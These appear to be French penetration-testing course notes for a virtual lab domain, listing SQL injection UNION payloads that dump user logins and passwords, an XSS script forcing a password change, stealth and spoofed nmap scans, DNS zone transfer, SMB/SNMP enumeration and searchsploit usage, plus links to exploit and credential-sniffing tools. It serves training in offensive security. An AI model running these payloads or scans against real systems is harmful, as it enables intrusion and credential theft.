# TRICKS




**Exercice : (Depuis la kali en rÃ©seau interne virtuel)**  
  
ping esdown.eu  
PING esdown.eu (172.16.10.10) 56(84) bytes of data.  
64 bytes from 172.16.10.10 (172.16.10.10): icmp_seq=1 ttl=63 time=2.54 ms  
64 bytes from 172.16.10.10 (172.16.10.10): icmp_seq=2 ttl=63 time=0.668 ms  
64 bytes from 172.16.10.10 (172.16.10.10): icmp_seq=3 ttl=63 time=0.612 ms  
  
Sinon DC pas allumÃ© ou VM web a un problÃ¨me  
  
**DEMO SQLinjection**  
  
' UNION SELECT null,database(),null,null,null,null,null# <= Enum BDD  
  
' UNION SELECT null,null,table_schema,table_name,null,null,null FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' # <= ENUM TABLE  
  
' UNION SELECT null,null,table_schema,table_name,column_name,null,null FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' # <= ENUM COLUMNS  
  
' UNION SELECT null,null,login,email,password,null,null FROM users# <= WIN !  
  
  
**LFI to RCE (Log Poisoning)**  
[https://www.hackingarticles.in/apache-log-poisoning-through-lfi/](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)  
  
**Exemple CSRF (via XSS)**  
<script>  
var xhr = new XMLHttpRequest();  
xhr.open("GET", "[http://bwapp.esdown.eu/csrf_1.php?password_new=toor&password_conf=toor&action=change&quot](http://bwapp.esdown.eu/csrf_1.php?password_new=toor&password_conf=toor&action=change&quot););  
xhr.send();  
</script>  
  
**Desobfusquer du PHP**  
unphp.net


[https://twitter.com/K_lfaa](https://twitter.com/K_lfaa)







Formation redteam  
  
**CRTO**Â   
[https://v3ded.github.io/misc/certified-red-team-operator-crto-review](https://v3ded.github.io/misc/certified-red-team-operator-crto-review)  
  
**Outils hacking**  
[https://lab401.com/fr](https://lab401.com/fr)  
  
**Rubber ducky du pauvre**  
[https://k-lfa.info/digispark-hacking/](https://k-lfa.info/digispark-hacking/)  
  
**Hacktrick <= Votre meilleur pote en pentest**  
[https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)  
  
**Conversion nmap XML => HTML**  
nmap .... -oA SCAN/scan  
xsltproc SCA/scan.xml -o SCAN/scan.html  
  
**Autre exploit**  
[https://sploitus.com/](https://sploitus.com/)  
  
**Cheatsheet privesc**  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
  
**Bruteshark (RÃ©seau)**  
[https://github.com/odedshimon/BruteShark](https://github.com/odedshimon/BruteShark)  
  
**PCredz (RÃ©seau)**  
[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)


Questionnaire de cadrage PTES  
[http://www.pentest-standard.org/index.php/Pre-engagement#General_Questions](http://www.pentest-standard.org/index.php/Pre-engagement#General_Questions)














mkdir /tmp/autoscan
mkdir /tmp/autoscan/results


discover 

awk -F " " '{print$1}'


for i in $(cat targets.txt) ; do smbmap -H $i >> /tmp/autoscan/results/SMB_network.txt ;done


nmap -iL targets.txt -R -sU -sS -p T:1-65535,U:161,53,69 -sC -PN -sV -O

## transfert de zone DNS
host -t axfr @esdown.local 10.10.10.30



for i in $(cat targets.txt); do snmp-check $i >> 10.10.10.10_24.txt ;done


eyewitness --web -x Pentest_Esdown/Nmap/10.10.10.0_24.xml -d Pentest_Esdown/Web_eyewitness --no-prompt --timeout 10



**Conversion nmap XML => HTML**  
nmap .... -oA SCAN/scan  
xsltproc SCA/scan.xml -o SCAN/scan.html




# NMAP

## Scan discret

Scan fragmentÃ© + Stealth scan 
```sh
nmap â€“f â€“sS <IP>
```

Scan discret (template) 
```sh
nmap -T0 <IP> 
```
Scan avec spoof dâ€™identitÃ© 
```sh
nmap -S <TARGET> <SPOOF> -e eth0 
```
Scan avec spoof d adresse mac <XX:XX:XX:XX:XX:XX> 
```sh
nmap 192.168.239.129 --spoof-mac <MAC> 
```
Idle scan depuis l hÃ´te 192.168.1.19 
```sh
nmap -sI <IDLE> <TARGET>
```

## Ã‰numÃ©ration agressive

Ã‰numÃ©ration agressive (attention verbeux) 
```sh
nmap -A -T5 -sC <IP> 
```
Scan version + systÃ¨me dâ€™exploitation 
```sh
nmap -sV -version-all -O -osscan-guess <IP>
```
## Ã©numÃ©ration ciblÃ©e

Ã‰numÃ©ration UDP ciblÃ© sur DNS & SNMP 
```sh
nmap -sU â€“p 53,161,162 --script dns*,snmp* <IP> 
```
Scan des versions de services uniquement 
```sh
nmap â€“sV <IP> 
```
enumeration RPC via un script ciblÃ© 
```sh
nmap -p 135-445 -script msrpc-enum.nse <IP>
```





## commandes utiles

Lister les droits sudo de l'utilisateur courant
```sh
sudo -l
```

Lister les connexions avec Netstat
```sh
netstat -elptena 
```



## Outils utiles

gtfobins.github.io





> [!note] PCredz 
This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
>
>**Features**
>- Extract from a pcap file or from a live interface IPv4 and IPv6:  
    - Credit card numbers
    - POP
    - SMTP
    - IMAP
    - SNMP community string
    - FTP
    - HTTP (NTLM/Basic/HTTP Forms)
    - NTLMv1/v2 (DCE-RPC,SMBv1/2,LDAP, MSSQL, HTTP, etc)
    - Kerberos (AS-REQ Pre-Auth etype 23) hashes.
>
>All hashes are displayed in a hashcat format (use -m 7500 for kerberos, -m 5500 for NTLMv1, -m 5600 for NTLMv2).
>Log all credentials and information to a file (CredentialDump-Session.log).
>Log credentials in the logs/ folder. MSKerb.txt, NTLMv1.txt and NTLMv2.txt can be directly fed to hashcat.
>
> https://github.com/lgandx






> [!note] BruteShark 
 BruteShark is a Network Forensic Analysis Tool (NFAT) that performs deep processing and inspection of
> network traffic (mainly PCAP files, but it also capable of directly live capturing from a network interface). It
> includes: password extracting, building a network map, reconstruct TCP sessions, extract hashes of
> encrypted passwords and even convert them to a Hashcat format in order to perform an offline Brute
> Force attack.
> 
> https://github.com/odedshimon/BruteShark





[www.bons-plans-astuces.com/redir/?url=https://tinyurl.com/bddjwpxh](https://www.bons-plans-astuces.com/redir/?url=https://tinyurl.com/bddjwpxh "https://www.bons-plans-astuces.com/redir/?url=https://tinyurl.com/bddjwpxh")







##### Utilisation de searchsploit

```sh
â”Œâ”€â”€(rootðŸ’€PENTEST-VM)-[/reverse]
â””â”€# searchsploit apache 2.4                                                                                                                                           2 â¨¯
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                         | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                       | php/remote/29316.py
Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                                       | unix/remote/30835.sh
Apache 2.4.17 - Denial of Service                                                                                                       | windows/dos/39037.php
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                                   | linux/local/46676.php
Apache 2.4.23 mod_http2 - Denial of Service                                                                                             | linux/dos/40909.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                         | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                            | linux/dos/34133.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                        | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                     | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                    | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                              | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                              | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                     | linux/webapps/39642.txt
Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE (Metasploit)                                                                        | multiple/remote/48410.rb
Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                      | multiple/remote/21492.txt
Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                         | multiple/remote/21490.txt
Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                 | multiple/remote/21491.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                       | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                     | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                               | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                            | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                            | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                            | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                        | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Pour l'utiliser,
copier-coller le lien (_exemple ==php/remote/29316.py==_)
```bash
python /usr/share/exploitdb/exploits/php/remote/xxxx.py
```




---------


####  Custom Script Automation Tool For Web Application Hacking & Reconnaissance
https://shubhdhungana.medium.com/hello-aaef10e10b79

Outil pour gÃ©nÃ©rer des rapports de Pentest : DRADIS




-----------

https://github.com/swisskyrepo/PayloadsAllTheThings

https://book.hacktricks.xyz/pentesting-web/file-inclusion

